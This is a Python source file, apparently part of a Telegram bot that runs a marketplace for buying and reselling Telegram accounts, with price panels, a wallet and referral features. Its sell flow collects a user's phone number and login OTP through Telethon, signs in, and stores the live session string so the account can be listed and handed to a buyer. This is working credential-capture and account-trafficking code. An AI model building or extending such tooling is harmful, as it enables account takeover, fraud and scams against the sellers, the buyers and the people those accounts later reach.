# ── PRICES ────────────────────────────────────────────────────────────────────
# Country flag emoji helper (converts country code to flag emoji)
def country_flag(code: str) -> str:
    try:
        return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in code.upper()[:2])
    except Exception:
        return "🌍"

async def cmd_prices(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Public /prices command — shows the buy price list."""
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, dial_code, price "
            "FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    if not rows:
        await update.message.reply_text(
            "No prices available yet. Check back soon!",
            reply_markup=main_menu_keyboard())
        return
    lines = ["<b>We buy from you:</b>\n"]
    for r in rows:
        flag = country_flag(r["country_code"])
        lines.append(
            f"[{flag}]+{r['dial_code']}-{r['country_code']}: {r['price']}$"
        )
    await update.message.reply_text(
        "\n".join(lines),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Sell Account", callback_data="menu_sell")]
        ])
    )


# ── ADMIN PRICE PANEL ─────────────────────────────────────────────────────────
(APANEL_ADD_WAITING, APANEL_EDIT_WAITING, APANEL_DEL_CONFIRM) = range(10, 13)

def _prices_panel_keyboard(rows):
    """Build the admin price panel keyboard."""
    buttons = []
    for r in rows:
        flag = country_flag(r["country_code"])
        buttons.append([
            InlineKeyboardButton(
                f"{flag} {r['country_code']} +{r['dial_code']} — {r['price']}$",
                callback_data=f"ap_view_{r['country_code']}"
            )
        ])
    buttons.append([InlineKeyboardButton("➕ Add Country", callback_data="ap_add")])
    buttons.append([InlineKeyboardButton("🔙 Close Panel", callback_data="ap_close")])
    return InlineKeyboardMarkup(buttons)

async def admin_prices_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin command /adminprices — opens the interactive price management panel."""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Not authorised.")
        return
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, dial_code, price "
            "FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    text = (
        "<b>Admin Price Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total countries: <b>{len(rows)}</b>\n\n"
        "Tap a country to edit or delete it.\n"
        "Tap ➕ Add Country to add a new one."
    )
    await update.message.reply_text(
        text, parse_mode="HTML",
        reply_markup=_prices_panel_keyboard(rows)
    )

async def ap_refresh(query, ctx):
    """Refresh the admin panel in-place."""
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, dial_code, price "
            "FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    text = (
        "<b>Admin Price Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total countries: <b>{len(rows)}</b>\n\n"
        "Tap a country to edit or delete it.\n"
        "Tap ➕ Add Country to add a new one."
    )
    await query.edit_message_text(
        text, parse_mode="HTML",
        reply_markup=_prices_panel_keyboard(rows)
    )

async def ap_view(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Show edit/delete options for a specific country."""
    query = update.callback_query
    await query.answer()
    code = query.data.split("ap_view_")[1]
    with get_db() as conn:
        row = conn.execute(
            "SELECT * FROM country_prices WHERE country_code=%s", (code,)
        ).fetchone()
    if not row:
        await query.answer("Not found.", show_alert=True)
        return
    flag = country_flag(code)
    await query.edit_message_text(
        f"<b>{flag} {row['country_name']}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Code:      <code>{row['country_code']}</code>\n"
        f"Dial code: <code>+{row['dial_code']}</code>\n"
        f"Price:     <b>{row['price']}$</b>\n\n"
        f"What would you like to do?",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✏️ Edit Price", callback_data=f"ap_edit_{code}")],
            [InlineKeyboardButton("🗑 Delete",     callback_data=f"ap_del_{code}")],
            [InlineKeyboardButton("🔙 Back",       callback_data="ap_back")],
        ])
    )

async def ap_edit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Ask admin for new price."""
    query = update.callback_query
    await query.answer()
    code = query.data.split("ap_edit_")[1]
    ctx.user_data["ap_edit_code"] = code
    await query.edit_message_text(
        f"✏️ Enter the new price for <code>{code}</code> (e.g. <code>1.50</code>):\n\n"
        f"Send /apcancel to go back.",
        parse_mode="HTML"
    )
    return APANEL_EDIT_WAITING

async def ap_edit_save(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Save the new price."""
    if update.effective_user.id != ADMIN_ID:
        return
    code = ctx.user_data.get("ap_edit_code")
    try:
        price = float(update.message.text.strip().replace("$", ""))
        if price <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Invalid price. Enter a number like <code>1.50</code>", parse_mode="HTML")
        return APANEL_EDIT_WAITING
    with get_db() as conn:
        conn.execute(
            "UPDATE country_prices SET price=%s, updated_at=NOW() WHERE country_code=%s",
            (price, code)
        )
    await update.message.reply_text(
        f"✅ <code>{code}</code> price updated to <b>{price}$</b>",
        parse_mode="HTML"
    )
    # Re-show the panel
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, dial_code, price "
            "FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    await update.message.reply_text(
        "<b>Admin Price Panel</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total countries: <b>{len(rows)}</b>\n\nTap a country to edit or delete.",
        parse_mode="HTML",
        reply_markup=_prices_panel_keyboard(rows)
    )
    return ConversationHandler.END

async def ap_del(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Confirm deletion."""
    query = update.callback_query
    await query.answer()
    code = query.data.split("ap_del_")[1]
    await query.edit_message_text(
        f"🗑 Are you sure you want to delete <code>{code}</code>?",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Yes, Delete", callback_data=f"ap_delconfirm_{code}")],
            [InlineKeyboardButton("❌ Cancel",      callback_data=f"ap_view_{code}")],
        ])
    )

async def ap_del_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Execute deletion."""
    query = update.callback_query
    await query.answer()
    code = query.data.split("ap_delconfirm_")[1]
    with get_db() as conn:
        conn.execute("DELETE FROM country_prices WHERE country_code=%s", (code,))
    await query.answer(f"✅ {code} deleted.", show_alert=True)
    await ap_refresh(query, ctx)

async def ap_add(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Ask admin for new country details."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "➕ <b>Add New Country</b>\n\n"
        "Send the details in this format:\n"
        "<code>CODE DIALCODE PRICE Country Name</code>\n\n"
        "Example:\n"
        "<code>IN 91 2.00 India</code>\n"
        "<code>US 1 8.00 United States</code>\n\n"
        "Send /apcancel to go back.",
        parse_mode="HTML"
    )
    return APANEL_ADD_WAITING

async def ap_add_save(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Save the new country."""
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        parts = update.message.text.strip().split(None, 3)
        code     = parts[0].upper()
        dial     = parts[1].lstrip("+")
        price    = float(parts[2])
        name     = parts[3]
        if price <= 0 or not dial.isdigit():
            raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ Wrong format. Use:\n<code>CODE DIALCODE PRICE Country Name</code>\n"
            "Example: <code>IN 91 2.00 India</code>",
            parse_mode="HTML"
        )
        return APANEL_ADD_WAITING
    with get_db() as conn:
        conn.execute(
            "INSERT INTO country_prices (country_code, country_name, dial_code, price) "
            "VALUES (%s,%s,%s,%s) ON CONFLICT (country_code) DO UPDATE "
            "SET country_name=%s, dial_code=%s, price=%s, updated_at=NOW()",
            (code, name, dial, price, name, dial, price)
        )
    await update.message.reply_text(
        f"✅ <b>{name}</b> (<code>{code}</code>) added at <b>{price}$</b>",
        parse_mode="HTML"
    )
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, dial_code, price "
            "FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    await update.message.reply_text(
        "<b>Admin Price Panel</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total countries: <b>{len(rows)}</b>\n\nTap a country to edit or delete.",
        parse_mode="HTML",
        reply_markup=_prices_panel_keyboard(rows)
    )
    return ConversationHandler.END

async def ap_back(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Go back to the main panel list."""
    query = update.callback_query
    await query.answer()
    await ap_refresh(query, ctx)

async def ap_close(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Close the panel."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("✅ Price panel closed.")
    return ConversationHandler.END

async def ap_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Cancel add/edit conversation."""
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, dial_code, price "
            "FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    await update.message.reply_text(
        "<b>Admin Price Panel</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total countries: <b>{len(rows)}</b>\n\nTap a country to edit or delete.",
        parse_mode="HTML",
        reply_markup=_prices_panel_keyboard(rows)
    )
    return ConversationHandler.END


# ── SELL FLOW ─────────────────────────────────────────────────────────────────
async def sell_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Entry point — shown when user taps Sell Account button."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "<b>SELL ACCOUNT</b>\n\n"
        "Want to sell your Telegram account and earn money?\n\n"
        "Check /prices to see how much we pay per country.\n\n"
        "<b>How to sell:</b>\n"
        "1. Check /prices for your country\n"
        "2. Send your phone number below\n"
        "3. Enter the OTP we send you\n"
        "4. We verify and list your account\n"
        "5. Get paid when it sells!\n\n"
        "Ready? Send your phone number with country code.\n"
        "Example: <code>+12345678900</code>\n\n"
        "Type /cancel to go back.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("View Prices", callback_data="sell_prices")],
            [InlineKeyboardButton("Back to Menu", callback_data="menu_back")]
        ])
    )
    return SELL_PHONE


async def sell_prices_inline(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Show prices from inline button inside sell conversation."""
    query = update.callback_query
    await query.answer()
    with get_db() as conn:
        rows = conn.execute(
            "SELECT country_code, country_name, price FROM country_prices ORDER BY country_name ASC"
        ).fetchall()
    if not rows:
        await query.answer("No prices set yet. Contact support.", show_alert=True)
        return SELL_PHONE
    lines = ["<b>Account Payout Prices</b>", "=" * 30]
    for r in rows:
        lines.append(
            f"<b>{r['country_name']}</b> (<code>{r['country_code']}</code>)"
            f" — <b>${r['price']:.2f}</b>"
        )
    lines.append("\nSend your phone number to proceed.")
    await query.edit_message_text(
        "\n".join(lines),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Back", callback_data="sell_back")]
        ])
    )
    return SELL_PHONE


async def sell_back_inline(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Go back to sell menu from prices view."""
    return await sell_menu(update, ctx)


async def sell_get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """User sent their phone number — send OTP via Telethon."""
    phone = update.message.text.strip()
    ctx.user_data["sell_phone"] = phone
    await update.message.reply_text("⏳ Sending OTP to your account...")

    if not API_ID or not API_HASH:
        await update.message.reply_text(
            "❌ <b>Configuration Error</b>\n\n<code>API_ID</code> or <code>API_HASH</code> not set.",
            parse_mode="HTML")
        return ConversationHandler.END

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        ctx.user_data["sell_client"] = client
        ctx.user_data["sell_phone_code_hash"] = result.phone_code_hash
        await update.message.reply_text(
            f"📩 <b>OTP Sent!</b>\n\n"
            f"A login code was sent to <code>{phone}</code>.\n\n"
            f"Please enter the OTP you received (digits only, e.g. <code>12345</code>):",
            parse_mode="HTML")
        return SELL_OTP
    except Exception as e:
        logger.error(f"Sell OTP error: {traceback.format_exc()}")
        await update.message.reply_text(
            f"❌ <b>Failed to send OTP</b>\n\n<code>{type(e).__name__}: {e}</code>\n\n"
            f"Please check the phone number and try again.",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard())
        return ConversationHandler.END

async def sell_get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """User sent OTP — sign in and save session, notify admin."""
    otp       = update.message.text.strip().replace(" ", "")
    client    = ctx.user_data.get("sell_client")
    phone     = ctx.user_data.get("sell_phone")
    code_hash = ctx.user_data.get("sell_phone_code_hash")
    user      = update.effective_user

    if not client:
        await update.message.reply_text(
            "❌ Session expired. Please tap Sell Account again.",
            reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    try:
        from telethon.sessions import StringSession
        await client.sign_in(phone, otp, phone_code_hash=code_hash)
        session_string = client.session.save()
        await client.disconnect()
        ctx.user_data["sell_session"] = session_string

        # Notify admin with full details to review and set a price
        await update.message.bot.send_message(
            ADMIN_ID,
            f"📥 <b>NEW ACCOUNT FOR SALE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Seller: @{user.username or user.first_name} (<code>{user.id}</code>)\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"To list this account, use:\n"
            f"<code>/add_sell {user.id}</code>",
            parse_mode="HTML"
        )

        # Store pending sell in DB for admin to approve
        with get_db() as conn:
            conn.execute(
                "INSERT INTO accounts (session, phone, price, status) VALUES (%s,%s,%s,'pending_review')",
                (session_string, phone, 0)
            )

        await update.message.reply_text(
            f"✅ <b>Account Submitted!</b>\n\n"
            f"📱 Phone: <code>{phone}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Your account has been sent to the admin for review.\n"
            f"Once approved and priced, it will be listed in the marketplace.\n\n"
            f"You'll be notified when it sells! 💰",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    except Exception as e:
        logger.error(f"Sell sign-in error: {traceback.format_exc()}")
        await update.message.reply_text(
            f"❌ <b>Login Failed</b>\n\n<code>{e}</code>\n\n"
            f"Please try again.",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard())
        return ConversationHandler.END

async def sell_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Cancel sell conversation."""
    # Disconnect any open Telethon client
    client = ctx.user_data.get("sell_client")
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    await update.message.reply_text("❌ Sell cancelled.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END

# ── WALLET / REFER / WITHDRAW ─────────────────────────────────────────────────
async def show_balance(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    ensure_user(user.id, user.username or "")
    await query.edit_message_text(
        f"╔══════════════════════╗\n      📊 *MY WALLET*\n╚══════════════════════╝\n\n"
        f"💼 *Available Balance*\n   *${get_balance(user.id):.2f} USD*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Referrals:       *{get_referral_count(user.id)}*\n"
        f"🤝 Referral Earned: *${get_referral_earnings(user.id):.2f}*\n━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Deposit",  callback_data="menu_deposit"),
             InlineKeyboardButton("💸 Withdraw", callback_data="menu_withdraw")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]]))

async def refer_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    ref_link = f"https://t.me/{ctx.bot.username}?start=ref_{user.id}"
    await query.edit_message_text(
        f"╔══════════════════════╗\n     👥 *REFER & EARN*\n╚══════════════════════╝\n\n"
        f"Invite friends and earn *{int(REFERRAL_COMMISSION*100)}% commission*\non every deposit — forever!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n📊 *Your Stats*\n"
        f"👥 Total Referrals: *{get_referral_count(user.id)}*\n"
        f"💰 Total Earned:    *${get_referral_earnings(user.id):.2f}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n🔗 *Your Referral Link:*\n`{ref_link}`\n\n"
        f"📤 Share this link. When they deposit, you get 2% instantly!",
        parse_mode="Markdown", reply_markup=back_keyboard())

async def withdraw_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"╔══════════════════════╗\n      💸 *WITHDRAW*\n╚══════════════════════╝\n\n"
        f"To withdraw, contact our support team.\n\n💰 Your Balance: *${get_balance(query.from_user.id):.2f}*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n📩 Contact support with:\n  • Withdrawal amount\n  • Payment method & details\n━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🆘 Contact Support", url=f"https://t.me/{SUPPORT_USERNAME}")],
            [InlineKeyboardButton("🔙 Back to Menu",    callback_data="menu_back")]]))

# ── Flask + Main ──────────────────────────────────────────────────────────────
def build_app() -> Application:
    app = Application.builder().token(BOT_TOKEN).build()
    deposit_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(deposit_start, pattern="^menu_deposit$")],
        states={DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)]},
        fallbacks=[CommandHandler("cancel", cancel)], per_message=False)
    login_conv = ConversationHandler(
        entry_points=[CommandHandler("login_account", admin_login)],
        states={
            ADMIN_PHONE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            ADMIN_OTP:       [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            ADMIN_ADD_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_price)],
        },
        fallbacks=[CommandHandler("cancel", cancel)], per_message=False)
    sell_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(sell_menu, pattern="^menu_sell$")],
        states={
            SELL_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, sell_get_phone),
                CallbackQueryHandler(sell_prices_inline, pattern="^sell_prices$"),
                CallbackQueryHandler(sell_back_inline,   pattern="^sell_back$"),
            ],
            SELL_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, sell_get_otp)],
        },
        fallbacks=[
            CommandHandler("cancel", sell_cancel),
            CallbackQueryHandler(lambda u, c: (u.callback_query.answer(), ConversationHandler.END)[1],
                                 pattern="^menu_back$"),
        ],
        per_message=False)
    # Admin price panel conversation
    apanel_conv = ConversationHandler(
        entry_points=[
            CommandHandler("adminprices", admin_prices_panel),
            CallbackQueryHandler(ap_add,  pattern="^ap_add$"),
        ],
        states={
            APANEL_ADD_WAITING:  [MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(ADMIN_ID), ap_add_save)],
            APANEL_EDIT_WAITING: [MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(ADMIN_ID), ap_edit_save)],
        },
        fallbacks=[CommandHandler("apcancel", ap_cancel)],
        per_message=False,
        allow_reentry=True,
    )
    app.add_handler(CommandHandler("start",    start))
    app.add_handler(deposit_conv)
    app.add_handler(login_conv)
    app.add_handler(sell_conv)
    app.add_handler(apanel_conv)
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("accounts",    admin_accounts))
    app.add_handler(CommandHandler("users",       admin_users))
    app.add_handler(CommandHandler("pending",     admin_pending))
    app.add_handler(CommandHandler("credit",      admin_credit))
    app.add_handler(CommandHandler("deduct",      admin_deduct))
    app.add_handler(CommandHandler("add_sell",    admin_add_sell))
    app.add_handler(CommandHandler("prices",      cmd_prices))
    # Admin panel inline button handlers (outside conversation for view/del/back/close)
    app.add_handler(CallbackQueryHandler(ap_view,       pattern=r"^ap_view_"))
    app.add_handler(CallbackQueryHandler(ap_edit,       pattern=r"^ap_edit_"))
    app.add_handler(CallbackQueryHandler(ap_del,        pattern=r"^ap_del_[A-Z]"))
    app.add_handler(CallbackQueryHandler(ap_del_confirm,pattern=r"^ap_delconfirm_"))
    app.add_handler(CallbackQueryHandler(ap_back,       pattern="^ap_back$"))
    app.add_handler(CallbackQueryHandler(ap_close,      pattern="^ap_close$"))
    app.add_handler(MessageHandler(filters.Regex(r"^/approve_\d+$") & filters.User(ADMIN_ID), admin_approve))
    app.add_handler(MessageHandler(filters.Regex(r"^/reject_\d+$")  & filters.User(ADMIN_ID), admin_reject))
    app.add_handler(MessageHandler(filters.Regex(r"^/del_\d+$")     & filters.User(ADMIN_ID), admin_delete))
    app.add_handler(CallbackQueryHandler(buy_menu,      pattern="^menu_buy$"))
    app.add_handler(CallbackQueryHandler(view_account,  pattern=r"^view_\d+$"))
    app.add_handler(CallbackQueryHandler(confirm_buy,   pattern=r"^confirm_\d+$"))
    app.add_handler(CallbackQueryHandler(show_balance,  pattern="^menu_balance$"))
    app.add_handler(CallbackQueryHandler(refer_menu,    pattern="^menu_refer$"))
    app.add_handler(CallbackQueryHandler(withdraw_menu, pattern="^menu_withdraw$"))
    app.add_handler(CallbackQueryHandler(menu_back,     pattern="^menu_back$"))
    return app

def main():
    global ptb_app
    init_db()
    ptb_app = build_app()

    import asyncio
    import threading

    # Create a dedicated event loop that runs in a background thread.
    # Flask runs in the main thread; all async PTB work runs on this loop.
    loop = asyncio.new_event_loop()

    def run_loop():
        asyncio.set_event_loop(loop)
        loop.run_forever()

    t = threading.Thread(target=run_loop, daemon=True)
    t.start()

    # Store loop so confirm_buy can schedule the OTP watcher on it
    flask_app.config["ASYNCIO_LOOP"] = loop

    @flask_app.get("/")
    def health():
        return Response("OK", status=200)

    @flask_app.post(f"/webhook/{BOT_TOKEN}")
    def webhook():
        data   = request.get_json(force=True)
        logger.info(f"Update {data.get('update_id')} | {list(data.keys())}")
        update = Update.de_json(data, ptb_app.bot)
        # Fire-and-forget — never block the webhook thread
        asyncio.run_coroutine_threadsafe(ptb_app.process_update(update), loop)
        return Response("ok", status=200)

    async def setup():
        await ptb_app.initialize()
        # Clear any stale webhook/pending updates, then set fresh webhook
        await ptb_app.bot.delete_webhook(drop_pending_updates=True)
        await ptb_app.bot.set_webhook(
            url=f"{WEBHOOK_URL}/webhook/{BOT_TOKEN}",
            drop_pending_updates=True,
            allowed_updates=["message", "callback_query"],
        )
        logger.info(f"✅ Webhook set → {WEBHOOK_URL}/webhook/{BOT_TOKEN}")

    asyncio.run_coroutine_threadsafe(setup(), loop).result(timeout=30)

    logger.info(f"🚀 Starting Flask on port {PORT}")
    flask_app.run(host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()
